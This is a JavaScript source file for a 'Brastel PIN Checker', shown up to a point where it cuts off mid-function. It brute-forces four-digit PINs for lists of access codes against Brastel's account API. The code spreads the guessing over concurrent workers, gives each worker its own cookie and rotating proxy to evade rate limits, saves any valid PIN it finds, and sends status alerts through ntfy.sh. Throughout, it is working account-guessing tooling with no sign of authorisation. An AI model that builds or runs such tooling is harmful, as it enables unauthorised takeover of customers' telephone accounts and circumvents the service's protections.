/**
 * Brastel PIN Checker - Enhanced Refactored Version
 * A modular PIN checking system with proxy rotation and concurrent workers
 */

const axios = require('axios');
const qs = require('qs');
const fsSync = require('fs');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fetch = require('node-fetch');

/**
 * Constants and enums
 */
const LOG_LEVELS = {
  INFO: 'INFO',
  ERROR: 'ERROR',
  SUCCESS: 'SUCCESS',
  WARNING: 'WARNING',
  PROXY: 'PROXY',
  FOUND: 'FOUND',
  SKIP: 'SKIP'
};

const EMOJIS = {
  [LOG_LEVELS.INFO]: '🔍',
  [LOG_LEVELS.ERROR]: '❌',
  [LOG_LEVELS.SUCCESS]: '✅',
  [LOG_LEVELS.WARNING]: '⚠️',
  [LOG_LEVELS.PROXY]: '🛡️',
  [LOG_LEVELS.FOUND]: '🎯',
  [LOG_LEVELS.SKIP]: '⏭️'
};

const API_RESULT_CODES = {
  SUCCESS: '0',
  NOT_FOUND: '100'
};

const FILE_NAMES = {
  SENT_PINS: 'sent_pins_history.json',
  BLACKLIST_PINS: 'blacklist_pins.json',
  VALID_PINS: 'valid_pins_found.json'
};

/**
 * Configuration Loader - Load config from text files
 */
class ConfigLoader {
  constructor() {
    this.configFiles = {
      pinRange: 'pinrange.txt',
      accessCodes: 'accesscodes.txt',
      proxies: 'proxies.txt',
      cookies: 'cookies.txt'
    };
  }

  /**
   * Load configuration from files
   */
  loadConfig() {
    const config = {
      // Default configuration
      maxRetries: 10,
      retryDelay: 3000,
      requestTimeout: 60000,
      maxUndefinedResults: 10,

      // Random processing configuration
      randomProcessing: {
        enabled: false,
        delayBetweenPins: 10
      },

      // Folder paths
      folders: {
        logs: 'Log',
        data: 'Data'
      },

      // File paths for tracking (will be dynamically generated based on accessCode)
      getFilePaths(accessCode) {
        const accessCodeFolder = path.join(this.folders.data, accessCode);
        return {
          folder: accessCodeFolder,
          sentPins: path.join(accessCodeFolder, FILE_NAMES.SENT_PINS),
          blacklistPins: path.join(accessCodeFolder, FILE_NAMES.BLACKLIST_PINS),
          validPins: path.join(accessCodeFolder, FILE_NAMES.VALID_PINS)
        };
      },

      // API endpoints and headers
      api: {
        url: 'https://www.brastel.com/web/WIMS/Manager.aspx',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'https://www.brastel.com/myaccount/m/password/eng',
          'Origin': 'https://www.brastel.com',
          'Accept-Encoding': 'gzip, deflate, br, zstd',
          'Accept-Language': 'en-US,en;q=0.9',
          'Connection': 'keep-alive'
        }
      },

      // Ntfy notification configuration
      ntfy: {
        enabled: true,
        server: 'https://ntfy.sh',
        topic: 'dhloc_error',
        topic_error: '7213784aafb',
        priority: '5'
      }
    };

    // Load PIN range
    const pinRange = this.loadPinRange();

    // Load access codes
    const accessCodes = this.loadAccessCodes(pinRange);

    // Load proxies and cookies
    const proxies = this.loadProxies();
    const cookies = this.loadCookies();

    // Set concurrent workers based on cookies count
    const concurrentWorkers = cookies.length;

    // Assign loaded values
    config.pinRange = pinRange;
    config.accessCodes = accessCodes;
    config.proxies = proxies;
    config.cookies = cookies;
    config.concurrentWorkers = concurrentWorkers;

    console.log(`✅ Loaded config: ${accessCodes.length} access codes, ${cookies.length} cookies, ${proxies.length} proxies`);
    console.log(`⚙️  Concurrent workers set to: ${concurrentWorkers} (based on cookies count)`);

    return config;
  }

  /**
   * Load PIN range from file
   */
  loadPinRange() {
    try {
      if (!fsSync.existsSync(this.configFiles.pinRange)) {
        console.log(`⚠️  ${this.configFiles.pinRange} not found, using default range 0-9999`);
        return { start: 0, end: 9999 };
      }

      const data = fsSync.readFileSync(this.configFiles.pinRange, 'utf8').trim().split('\n');
      const start = parseInt(data[0]) || 0;
      const end = parseInt(data[1]) || 9999;

      console.log(`📊 PIN Range: ${start} - ${end}`);
      return { start, end };
    } catch (error) {
      console.log(`❌ Error loading ${this.configFiles.pinRange}: ${error.message}`);
      return { start: 0, end: 9999 };
    }
  }

  /**
   * Load access codes from file
   */
  loadAccessCodes(pinRange) {
    try {
      if (!fsSync.existsSync(this.configFiles.accessCodes)) {
        console.log(`⚠️  ${this.configFiles.accessCodes} not found, using default access codes`);
        return [];
      }

      const data = fsSync.readFileSync(this.configFiles.accessCodes, 'utf8')
        .trim()
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0);

      const accessCodes = data.map(accessCode => ({
        accessCode,
        pinRange: { ...pinRange }
      }));

      console.log(`🎯 Access Codes: ${accessCodes.map(ac => ac.accessCode).join(', ')}`);
      return accessCodes;
    } catch (error) {
      console.log(`❌ Error loading ${this.configFiles.accessCodes}: ${error.message}`);
      return [];
    }
  }

  /**
   * Load proxies from file
   */
  loadProxies() {
    try {
      if (!fsSync.existsSync(this.configFiles.proxies)) {
        console.log(`⚠️  ${this.configFiles.proxies} not found, using no proxy`);
        return [''];
      }

      const data = fsSync.readFileSync(this.configFiles.proxies, 'utf8')
        .trim()
        .split('\n')
        .map(line => line.trim());

      // If file is empty or only has empty lines, use no proxy
      if (data.length === 0 || data.every(line => line === '')) {
        console.log('🛡️  Proxies: No proxy configured');
        return [''];
      }

      console.log(`🛡️  Proxies: ${data.length} proxy(ies) loaded`);
      return data;
    } catch (error) {
      console.log(`❌ Error loading ${this.configFiles.proxies}: ${error.message}`);
      return [''];
    }
  }

  /**
   * Load cookies from file
   */
  loadCookies() {
    try {
      if (!fsSync.existsSync(this.configFiles.cookies)) {
        console.log(`⚠️  ${this.configFiles.cookies} not found`);
        return [];
      }

      const data = fsSync.readFileSync(this.configFiles.cookies, 'utf8')
        .trim()
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0);

      if (data.length === 0) {
        throw new Error('No cookies found in file');
      }

      console.log(`🍪 Cookies: ${data.length} cookie(s) loaded`);
      return data;
    } catch (error) {
      console.log(`❌ Error loading ${this.configFiles.cookies}: ${error.message}`);
      return [];
    }
  }
}

// Initialize configuration
const configLoader = new ConfigLoader();
const CONFIG = configLoader.loadConfig();

/**
 * Utility functions
 */
class Utils {
  /**
   * Format PIN with leading zeros
   * @param {number} pin - PIN number
   * @returns {string} Formatted PIN
   */
  static formatPin(pin) {
    return pin.toString().padStart(4, '0');
  }

  /**
   * Create directory if it doesn't exist
   * @param {string} dirPath - Directory path
   */
  static ensureDirectoryExists(dirPath) {
    if (!fsSync.existsSync(dirPath)) {
      fsSync.mkdirSync(dirPath, { recursive: true });
      return true;
    }
    return false;
  }

  /**
   * Delay execution
   * @param {number} ms - Milliseconds to delay
   */
  static delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Generate array of numbers in range
   * @param {number} start - Start number
   * @param {number} end - End number
   * @returns {Array<number>} Array of numbers
   */
  static generateRange(start, end) {
    return Array.from({ length: end - start + 1 }, (_, i) => start + i);
  }

  /**
   * Split array into chunks
   * @param {Array} array - Array to split
   * @param {number} chunkSize - Size of each chunk
   * @returns {Array<Array>} Array of chunks
   */
  static chunkArray(array, chunkSize) {
    const chunks = [];
    for (let i = 0; i < array.length; i += chunkSize) {
      chunks.push(array.slice(i, i + chunkSize));
    }
    return chunks;
  }

  /**
   * Shuffle array using Fisher-Yates algorithm
   * @param {Array} array - Array to shuffle
   * @returns {Array} Shuffled array (new array, doesn't modify original)
   */
  static shuffleArray(array) {
    const shuffled = [...array]; // Create a copy
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }


}

/**
 * File Manager class for handling PIN tracking files
 */
class FileManager {
  constructor(logger, accessCode) {
    this.logger = logger;
    this.accessCode = accessCode;
    this.filePaths = CONFIG.getFilePaths(accessCode);
    this.cache = new Map(); // Cache for frequently accessed data
    this.initialize();
  }

  /**
   * Initialize file system and cache
   */
  initialize() {
    this.ensureFoldersExist();
    this.ensureFilesExist();
    this.loadCache();
  }

  /**
   * Ensure all required folders exist
   */
  ensureFoldersExist() {
    // Create main folders
    Object.values(CONFIG.folders).forEach(folderPath => {
      if (Utils.ensureDirectoryExists(folderPath)) {
        this.logger.info(`Created folder: ${folderPath}`);
      }
    });

    // Create accessCode specific folder
    if (Utils.ensureDirectoryExists(this.filePaths.folder)) {
      this.logger.info(`Created accessCode folder: ${this.filePaths.folder}`);
    }
  }

  /**
   * Ensure all tracking files exist
   */
  ensureFilesExist() {
    const filesToCreate = [
      this.filePaths.sentPins,
      this.filePaths.blacklistPins,
      this.filePaths.validPins
    ];

    filesToCreate.forEach(filepath => {
      if (!fsSync.existsSync(filepath)) {
        this.writeJsonFileSync(filepath, []);
        this.logger.info(`Created tracking file for ${this.accessCode}: ${filepath}`);
      }
    });
  }

  /**
   * Load data into cache
   */
  loadCache() {
    try {
      this.cache.set('sentPins', new Set(this.readJsonFileSync(this.filePaths.sentPins)));
      this.cache.set('blacklistPins', new Set(this.readJsonFileSync(this.filePaths.blacklistPins)));
    } catch (error) {
      this.logger.error(`Error loading cache: ${error.message}`);
    }
  }

  /**
   * Read JSON file safely (synchronous)
   * @param {string} filename - File to read
   * @returns {Array} Array data from file
   */
  readJsonFileSync(filename) {
    try {
      const data = fsSync.readFileSync(filename, 'utf8');
      return JSON.parse(data) || [];
    } catch (error) {
      this.logger.warning(`Error reading ${filename}: ${error.message}`);
      return [];
    }
  }

  /**
   * Write JSON file safely (synchronous)
   * @param {string} filename - File to write
   * @param {Array} data - Data to write
   */
  writeJsonFileSync(filename, data) {
    try {
      fsSync.writeFileSync(filename, JSON.stringify(data, null, 2));
    } catch (error) {
      this.logger.error(`Error writing ${filename}: ${error.message}`);
    }
  }

  /**
   * Check if PIN was already sent (using cache)
   * @param {string} pin - PIN to check
   * @returns {boolean} True if already sent
   */
  isPinSent(pin) {
    const sentPins = this.cache.get('sentPins');
    return sentPins ? sentPins.has(pin) : false;
  }

  /**
   * Add PIN to sent history
   * @param {string} pin - PIN to add
   */
  addSentPin(pin) {
    const sentPinsSet = this.cache.get('sentPins');
    if (!sentPinsSet.has(pin)) {
      sentPinsSet.add(pin);
      const sentPinsArray = Array.from(sentPinsSet);
      this.writeJsonFileSync(this.filePaths.sentPins, sentPinsArray);
    }
  }

  /**
   * Get all sent PINs
   * @returns {Array} Array of sent PINs
   */
  getSentPins() {
    return Array.from(this.cache.get('sentPins') || []);
  }

  /**
   * Check if PIN is blacklisted (using cache)
   * @param {string} pin - PIN to check
   * @returns {boolean} True if blacklisted
   */
  isBlacklisted(pin) {
    const blacklistPins = this.cache.get('blacklistPins');
    return blacklistPins ? blacklistPins.has(pin) : false;
  }

  /**
   * Add PIN to blacklist
   * @param {string} pin - PIN to blacklist
   */
  addBlacklistPin(pin) {
    const blacklistSet = this.cache.get('blacklistPins');
    if (!blacklistSet.has(pin)) {
      blacklistSet.add(pin);
      const blacklistArray = Array.from(blacklistSet);
      this.writeJsonFileSync(this.filePaths.blacklistPins, blacklistArray);
      this.logger.warning(`Added PIN ${pin} to blacklist for ${this.accessCode}`);
    }
  }

  /**
   * Get all blacklisted PINs
   * @returns {Array} Array of blacklisted PINs
   */
  getBlacklistPins() {
    return Array.from(this.cache.get('blacklistPins') || []);
  }

  /**
   * Add valid PIN to results
   * @param {string} pin - Valid PIN found
   */
  addValidPin(pin) {
    const validPins = this.readJsonFileSync(this.filePaths.validPins);
    const entry = {
      pin,
      accessCode: this.accessCode,
      timestamp: new Date().toISOString()
    };
    validPins.push(entry);
    this.writeJsonFileSync(this.filePaths.validPins, validPins);
    this.logger.found(`Saved valid PIN for ${this.accessCode} to file: ${pin}`);
  }

  /**
   * Get valid PINs
   * @returns {Array} Array of valid PINs
   */
  getValidPins() {
    return this.readJsonFileSync(this.filePaths.validPins);
  }

  /**
   * Get statistics
   * @returns {Object} Statistics object
   */
  /**
   * Check if there are any valid PINs that are not blacklisted
   * @returns {boolean} True if there are valid non-blacklisted PINs
   */
  hasValidNonBlacklistedPins() {
    const validPins = this.getValidPins();
    if (validPins.length === 0) {
      return false;
    }

    // Check if any valid PIN is not in blacklist
    return validPins.some(validPin => {
      return !this.isBlacklisted(validPin.pin);
    });
  }

  /**
   * Get valid PINs that are not blacklisted
   * @returns {Array} Array of valid non-blacklisted PINs
   */
  getValidNonBlacklistedPins() {
    const validPins = this.getValidPins();
    return validPins.filter(validPin => {
      return !this.isBlacklisted(validPin.pin);
    });
  }

  getStatistics() {
    const validNonBlacklisted = this.getValidNonBlacklistedPins();
    const sentPins = this.cache.get('sentPins');
    const blacklistPins = this.cache.get('blacklistPins');
    return {
      sentPinsCount: sentPins ? sentPins.size : 0,
      blacklistPinsCount: blacklistPins ? blacklistPins.size : 0,
      validPinsCount: this.getValidPins().length,
      validNonBlacklistedCount: validNonBlacklisted.length,
      blacklistedPins: this.getBlacklistPins(),
      validPins: this.getValidPins(),
      validNonBlacklistedPins: validNonBlacklisted
    };
  }
}

/**
 * Logger class for handling all logging operations
 */
class Logger {
  constructor(accessCode) {
    this.accessCode = accessCode;
    this.logFile = path.join(CONFIG.folders.logs, `log_${accessCode}.txt`);
    this.initialize();
  }

  /**
   * Initialize logger
   */
  initialize() {
    Utils.ensureDirectoryExists(CONFIG.folders.logs);
  }

  /**
   * Log a message to both console and file
   * @param {string} message - Message to log
   * @param {string} level - Log level
   */
  log(message, level = LOG_LEVELS.INFO) {
    const timestamp = new Date().toISOString();
    const emoji = EMOJIS[level] || '📝';
    const fullMessage = `[${timestamp}] ${emoji} [${this.accessCode}] ${message}`;

    console.log(fullMessage);
    fsSync.appendFileSync(this.logFile, `${fullMessage}\n`);
  }

  // Convenience methods
  info(message) { this.log(message, LOG_LEVELS.INFO); }
  error(message) { this.log(message, LOG_LEVELS.ERROR); }
  success(message) { this.log(message, LOG_LEVELS.SUCCESS); }
  warning(message) { this.log(message, LOG_LEVELS.WARNING); }
  proxy(message) { this.log(message, LOG_LEVELS.PROXY); }
  found(message) { this.log(message, LOG_LEVELS.FOUND); }
  skip(message) { this.log(message, LOG_LEVELS.SKIP); }
}

/**
 * Proxy Manager class for handling proxy operations
 */
class ProxyManager {
  constructor(logger) {
    this.logger = logger;
  }

  /**
   * Create proxy agent from static proxy URL
   * @param {string} proxyUrl - Static proxy URL
   * @returns {Object|null} Proxy agent or null
   */
  createStaticProxy(proxyUrl) {
    if (!proxyUrl) return null;
    try {
      return new HttpsProxyAgent(proxyUrl);
    } catch (error) {
      this.logger.error(`Failed to create proxy agent: ${error.message}`);
      return null;
    }
  }
}

/**
 * API Request class for handling HTTP requests
 */
class ApiRequest {
  constructor(logger, proxyManager) {
    this.logger = logger;
    this.proxyManager = proxyManager;
  }

  /**
   * Create request configuration
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @returns {Object} Request configuration
   */
  createRequestConfig(agent, cookie) {
    const config = {
      headers: {
        ...CONFIG.api.headers,
        'Cookie': cookie
      },
      proxy: false,
      timeout: CONFIG.requestTimeout
    };

    if (agent) {
      config.httpsAgent = agent;
    }

    return config;
  }

  /**
   * Create request data
   * @param {string} accessCode - Access code
   * @param {string} pin - PIN to check
   * @returns {Object} Request data
   */
  createRequestData(accessCode, pin) {
    return {
      xslFile: 'ajax_sip_050_activation.xsl',
      action: 'ReturnSPCNumber',
      accessCode,
      style: '14',
      service: '1',
      pin
    };
  }

  /**
   * Make API request
   * @param {string} accessCode - Access code
   * @param {string} pin - PIN to check
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @returns {Promise<Object>} Response data
   */
  async makeRequest(accessCode, pin, agent, cookie) {
    const requestConfig = this.createRequestConfig(agent, cookie);
    const data = this.createRequestData(accessCode, pin);

    const response = await axios.post(CONFIG.api.url, qs.stringify(data), requestConfig);
    return response.data;
  }
}

/**
 * PIN Checker class for handling PIN validation requests
 */
class PinChecker {
  constructor(logger, proxyManager, fileManager, accessCode) {
    this.logger = logger;
    this.proxyManager = proxyManager;
    this.fileManager = fileManager;
    this.accessCode = accessCode;
    this.apiRequest = new ApiRequest(logger, proxyManager);
    this.ntfyNotifier = new NtfyNotifier(logger);
    this.found = false;
    this.undefinedCount = 0; // Per-worker undefined counter
    this.shouldStopWorker = false; // Per-worker stop flag
  }

  /**
   * Check if should stop processing
   * @returns {boolean} True if should stop
   */
  shouldStop() {
    return this.found || this.shouldStopWorker;
  }

  /**
   * Reset undefined counter when getting valid results
   */
  resetUndefinedCount() {
    this.undefinedCount = 0;
  }

  /**
   * Handle undefined result
   * @param {string} pin - PIN being checked
   * @param {number} workerId - Worker ID
   * @returns {boolean} True if should stop this worker
   */
  handleUndefinedResult(pin, workerId) {
    this.undefinedCount++;
    this.logger.warning(`Worker ${workerId} - Error checking PIN ${pin} (Worker undefined count: ${this.undefinedCount}/${CONFIG.maxUndefinedResults})`);

    if (this.undefinedCount >= CONFIG.maxUndefinedResults) {
      this.shouldStopWorker = true;
      this.logger.error(`Worker ${workerId} - Undefined results limit exceeded (${this.undefinedCount}/${CONFIG.maxUndefinedResults}). Stopping this worker only.`);

      // Send immediate notification about worker being stopped
      this.ntfyNotifier.sendWorkerStoppedNotification(
        this.accessCode,
        workerId,
        this.undefinedCount,
        CONFIG.maxUndefinedResults
      ).catch(error => {
        this.logger.error(`Failed to send worker stopped notification: ${error.message}`);
      });

      return true;
    }
    return false;
  }

  /**
   * Process API result
   * @param {Object} result - API response
   * @param {string} pin - PIN being checked
   * @param {number} workerId - Worker ID
   * @param {string} additionalInfo - Additional logging information (optional)
   * @returns {boolean} True if PIN is valid
   */
  async processResult(result, pin, workerId, additionalInfo = '') {
    const logMessage = `Worker ${workerId} - PIN: ${pin} | Result: ${result.result} - ${result.errorMsg}`;
    const fullMessage = additionalInfo ? `${logMessage} | ${additionalInfo}` : logMessage;

    this.logger.info(fullMessage);

    // Reset undefined counter since we got a valid response
    this.resetUndefinedCount();

    if (result.result === API_RESULT_CODES.SUCCESS) {
      // Check if this PIN is blacklisted
      if (this.fileManager.isBlacklisted(pin)) {
        this.logger.warning(`Worker ${workerId} - PIN ${pin} is blacklisted but returned success. Continuing...`);
        return false; // Continue processing instead of stopping
      }

      // Valid PIN found
      this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin}`);
      this.fileManager.addValidPin(pin);

      this.found = true;
      return true;
    }

    return false; // PIN is invalid or other result
  }

  /**
   * Check a single PIN
   * @param {string} pin - PIN to check
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @param {number} workerId - Worker ID
   * @param {string} additionalInfo - Additional logging information (optional)
   * @returns {Promise<boolean>} True if PIN is valid
   */
  async checkPin(pin, agent, cookie, workerId, additionalInfo = '') {
    for (let attempt = 1; attempt <= CONFIG.maxRetries; attempt++) {
      if (this.shouldStop()) return false;

      try {
        const result = await this.apiRequest.makeRequest(this.accessCode, pin, agent, cookie);

        if (result.result === undefined) {
          if (this.handleUndefinedResult(pin, workerId)) {
            return false;
          }
          await Utils.delay(CONFIG.retryDelay);
          continue;
        }

        // Mark PIN as sent
        this.fileManager.addSentPin(pin);
        return await this.processResult(result, pin, workerId, additionalInfo);

      } catch (error) {
        this.logger.error(`Worker ${workerId} - Error checking PIN ${pin} (attempt ${attempt}): ${error.message}`);
        if (attempt < CONFIG.maxRetries) {
          await Utils.delay(CONFIG.retryDelay);
        }
      }
    }
    return false;
  }
}

/**
 * Worker class for processing PINs
 */
class Worker {
  constructor(id, logger, proxyManager, pinChecker, fileManager, proxy, cookie) {
    this.id = id;
    this.logger = logger;
    this.proxyManager = proxyManager;
    this.pinChecker = pinChecker;
    this.fileManager = fileManager;
    this.proxy = proxy;
    this.cookie = cookie;
    this.agent = this.proxyManager.createStaticProxy(proxy);
  }

  /**
   * Format PINs for processing (PINs đã được lọc ở distributePins)
   * @param {Array<number>} pins - Array of PINs to format
   * @returns {Array<string>} Array of formatted PINs
   */
  formatPins(pins) {
    return pins.map(pin => Utils.formatPin(pin));
  }

  /**
   * Process a list of PINs (either sequentially or with shuffle random selection)
   * @param {Array<number>} pins - Array of PINs to check
   */
  async process(pins) {
    const formattedPins = this.formatPins(pins);
    const proxyInfo = this.proxy ? `via ${this.proxy}` : 'direct connection';

    this.logger.info(`Worker ${this.id} - Processing ${formattedPins.length} PINs ${proxyInfo}`);

    if (formattedPins.length === 0) {
      this.logger.warning(`Worker ${this.id} - No PINs available to process`);
      return;
    }

    // Choose processing mode based on configuration
    if (CONFIG.randomProcessing.enabled) {
      this.logger.info(`Worker ${this.id} - Using random shuffle processing mode`);
      await this.processWithShuffle(formattedPins);
    } else {
      this.logger.info(`Worker ${this.id} - Using sequential processing mode`);
      await this.processSequentially(formattedPins);
    }
  }

  /**
   * Process PINs sequentially (original method)
   * @param {Array<string>} unsentPins - Array of unsent formatted PINs
   */
  async processSequentially(unsentPins) {
    for (let i = 0; i < unsentPins.length; i++) {
      const pin = unsentPins[i];

      if (this.pinChecker.shouldStop()) {
        this.logger.warning(`Worker ${this.id} - Stopping due to shouldStop() condition`);
        return;
      }
      const progressInfo = `Progress: ${i + 1}/${unsentPins.length}`;
      await this.pinChecker.checkPin(pin, this.agent, this.cookie, this.id, progressInfo);
    }
    this.logger.info(`Worker ${this.id} - Completed sequential processing`);
  }

  /**
   * Process PINs with random shuffle selection
   * @param {Array<string>} unsentPins - Array of unsent formatted PINs
   */
  async processWithShuffle(unsentPins) {
    // Shuffle the unsent pins array for random processing
    const shuffledPins = Utils.shuffleArray(unsentPins);

    this.logger.info(`Worker ${this.id} - Processing ${shuffledPins.length} PINs in random order`);

    // Process pins one by one in random order
    for (let i = 0; i < shuffledPins.length; i++) {
      const pin = shuffledPins[i];

      if (this.pinChecker.shouldStop()) {
        this.logger.warning(`Worker ${this.id} - Stopping due to shouldStop() condition`);
        return;
      }

      // Add a small delay between random selections
      if (i > 0) {
        await Utils.delay(CONFIG.randomProcessing.delayBetweenPins);
      }

      const progressInfo = `Progress: ${i + 1}/${shuffledPins.length}`;
      await this.pinChecker.checkPin(pin, this.agent, this.cookie, this.id, progressInfo);
    }

    this.logger.success(`Worker ${this.id} - Completed random shuffle processing of all ${shuffledPins.length} PINs`);
  }
}

/**
 * Single Access Code Checker - handles one accessCode
 */
class SingleAccessCodeChecker {
  constructor(accessCodeConfig) {
    this.accessCode = accessCodeConfig.accessCode;
    this.pinRange = accessCodeConfig.pinRange;
    this.logger = new Logger(this.accessCode);
    this.fileManager = new FileManager(this.logger, this.accessCode);
    this.proxyManager = new ProxyManager(this.logger);
    this.pinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);
    this.workersStoppedByUndefined = 0; // Track workers stopped by undefined limit
    this.totalWorkers = 0; // Track total workers
  }

  /**
   * Generate PIN range for this accessCode
   * @returns {Array<number>} Array of PINs to check
   */
  generatePinRange() {
    return Utils.generateRange(this.pinRange.start, this.pinRange.end);
  }

  /**
   * Distribute PINs among workers
   * @param {Array<number>} pins - Array of PINs
   * @returns {Array<Array<number>>} Array of PIN batches for workers
   */
  distributePins(pins) {
    // Lọc PIN đã gửi trước khi chia chunk để đảm bảo phân bố đều
    const unsentPins = pins.filter(pin => {
      const formattedPin = Utils.formatPin(pin);
      return !this.fileManager.isPinSent(formattedPin);
    });

    this.logger.info(`Total PINs in range: ${pins.length}`);
    this.logger.info(`Unsent PINs available: ${unsentPins.length}`);
    this.logger.info(`Already sent PINs: ${pins.length - unsentPins.length}`);

    if (unsentPins.length === 0) {
      this.logger.warning('No unsent PINs available to process');
      return [];
    }

    const batchSize = Math.ceil(unsentPins.length / CONFIG.concurrentWorkers);
    const pinBatches = Utils.chunkArray(unsentPins, batchSize);

    this.logger.info(`Distributed ${unsentPins.length} unsent PINs into ${pinBatches.length} batches`);
    pinBatches.forEach((batch, index) => {
      this.logger.info(`Worker ${index + 1} will process ${batch.length} PINs`);
    });

    return pinBatches;
  }

  /**
   * Display statistics for this accessCode
   */
  displayStats() {
    const stats = this.fileManager.getStatistics();

    this.logger.info('=== STATISTICS ===');
    this.logger.info(`Access Code: ${this.accessCode}`);
    this.logger.info(`PIN Range: ${this.pinRange.start} - ${this.pinRange.end}`);
    this.logger.info(`Total PINs sent: ${stats.sentPinsCount}`);
    this.logger.info(`Blacklisted PINs: ${stats.blacklistPinsCount}`);
    this.logger.info(`Valid PINs found: ${stats.validPinsCount}`);
    this.logger.info(`Valid PINs (not blacklisted): ${stats.validNonBlacklistedCount}`);

    if (stats.blacklistedPins.length > 0) {
      this.logger.info(`Blacklisted: ${stats.blacklistedPins.join(', ')}`);
    }

    if (stats.validPins.length > 0) {
      this.logger.success(`All Valid PINs: ${stats.validPins.map(p => p.pin).join(', ')}`);
    }

    if (stats.validNonBlacklistedPins.length > 0) {
      this.logger.found(`Valid PINs (not blacklisted): ${stats.validNonBlacklistedPins.map(p => p.pin).join(', ')}`);
    }

    this.logger.info('Files location:');
    this.logger.info(`- Sent PINs: ${this.fileManager.filePaths.sentPins}`);
    this.logger.info(`- Blacklist: ${this.fileManager.filePaths.blacklistPins}`);
    this.logger.info(`- Valid PINs: ${this.fileManager.filePaths.validPins}`);
  }

  /**
   * Handle completion status and send notifications
   * @param {boolean} hadExistingValidPins - Whether valid non-blacklisted PINs existed before processing
   * @param {Array<number>} unsentPins - Array of unsent PINs that were available for processing
   * @returns {Promise<void>}
   */
  async handleCompletion(hadExistingValidPins, unsentPins) {
    const stats = this.fileManager.getStatistics();
    const ntfyNotifier = new NtfyNotifier(this.logger);

    let status, reason, logMessage;
    // Determine completion status and reason
    if (hadExistingValidPins) {
      // Had existing valid PINs before processing started
      status = 'found';
      reason = 'Valid non-blacklisted PIN(s) already existed before processing';
      logMessage = `✅ AccessCode ${this.accessCode} completion: Valid PIN(s) already existed`;
    } else if (this.pinChecker.found || stats.validNonBlacklistedCount > 0) {
      // Found valid PIN during processing
      status = 'found';
      reason = 'Valid PIN found during processing';
      logMessage = `✅ AccessCode ${this.accessCode} completion: Valid PIN found during processing`;
    } else if (this.workersStoppedByUndefined > 0) {
      // Some workers were stopped due to undefined results limit
      status = 'stopped';
      reason = `Processing stopped: ${this.workersStoppedByUndefined}/${this.totalWorkers} worker(s) exceeded undefined results limit (${CONFIG.maxUndefinedResults})`;
      logMessage = `🛑 AccessCode ${this.accessCode} completion: ${this.workersStoppedByUndefined} worker(s) stopped due to undefined results limit`;
    } else if (unsentPins.length === 0) {
      // No unsent PINs were available to process
      status = 'completed';
      reason = 'No unsent PINs available for processing (all PINs already sent)';
      logMessage = `⚠️ AccessCode ${this.accessCode} completion: All PINs already processed`;
    } else {
      // Processing completed without finding valid PIN
      status = 'completed';
      reason = 'Processing completed without finding valid PIN';
      logMessage = `⚠️ AccessCode ${this.accessCode} completion: No valid PIN found after processing`;
    }

    // Log the completion status
    this.logger.info('=== COMPLETION STATUS ===');
    this.logger.info(logMessage);
    this.logger.info(`Status: ${status}`);
    this.logger.info(`Reason: ${reason}`);
    this.logger.info(`Final Stats - Sent: ${stats.sentPinsCount}, Blacklisted: ${stats.blacklistPinsCount}, Valid: ${stats.validPinsCount}, Valid Non-Blacklisted: ${stats.validNonBlacklistedCount}`);

    // Send ntfy notification
    try {
      const completionInfo = {
        status,
        reason,
        stats
      };

      await ntfyNotifier.sendAccessCodeCompletionNotification(this.accessCode, completionInfo);
    } catch (error) {
      this.logger.error(`Failed to send AccessCode completion notification: ${error.message}`);
    }
  }

  /**
   * Create workers
   * @param {Array<Array<number>>} pinBatches - PIN batches for workers
   * @returns {Array<Promise>} Array of worker promises
   */
  createWorkers(pinBatches) {
    const workers = [];
    this.totalWorkers = CONFIG.concurrentWorkers;

    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
      // Create a separate PinChecker instance for each worker to avoid shared state
      const workerPinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);

      // Share the 'found' state from the main pinChecker so all workers can see when to stop
      Object.defineProperty(workerPinChecker, 'found', {
        get: () => this.pinChecker.found,
        set: (value) => { this.pinChecker.found = value; }
      });

      // Assign fixed cookie and proxy for each worker
      const cookie = CONFIG.cookies[i % CONFIG.cookies.length];
      const proxy = CONFIG.proxies[i % CONFIG.proxies.length] || '';

      const worker = new Worker(i + 1, this.logger, this.proxyManager, workerPinChecker, this.fileManager, proxy, cookie);

      // Create a wrapper promise that tracks if worker was stopped due to undefined results
      const workerPromise = worker.process(pinBatches[i] || []).then(() => {
        // Check if this worker was stopped due to undefined results
        if (workerPinChecker.shouldStopWorker) {
          this.workersStoppedByUndefined++;
          this.logger.warning(`Worker ${i + 1} was stopped due to undefined results limit (Total stopped: ${this.workersStoppedByUndefined}/${this.totalWorkers})`);
        }
      });

      workers.push(workerPromise);
    }

    return workers;
  }

  /**
   * Start the PIN checking process for this accessCode
   * @returns {Promise<boolean>} True if should continue to next accessCode
   */
  async start() {
    this.logger.info(`Starting PIN Checker for AccessCode: ${this.accessCode}`);
    this.logger.info(`PIN Range: ${this.pinRange.start} - ${this.pinRange.end}`);
    this.logger.info(`Concurrent Workers: ${CONFIG.concurrentWorkers}`);

    // Display current statistics
    this.displayStats();

    // Check if we already have valid non-blacklisted PINs
    const hadExistingValidPins = this.fileManager.hasValidNonBlacklistedPins();
    if (hadExistingValidPins) {
      const validPins = this.fileManager.getValidNonBlacklistedPins();
      this.logger.success(`AccessCode ${this.accessCode} already has valid PIN(s): ${validPins.map(p => p.pin).join(', ')}`);
      this.logger.info('These PINs are not blacklisted, so processing is complete for this accessCode.');
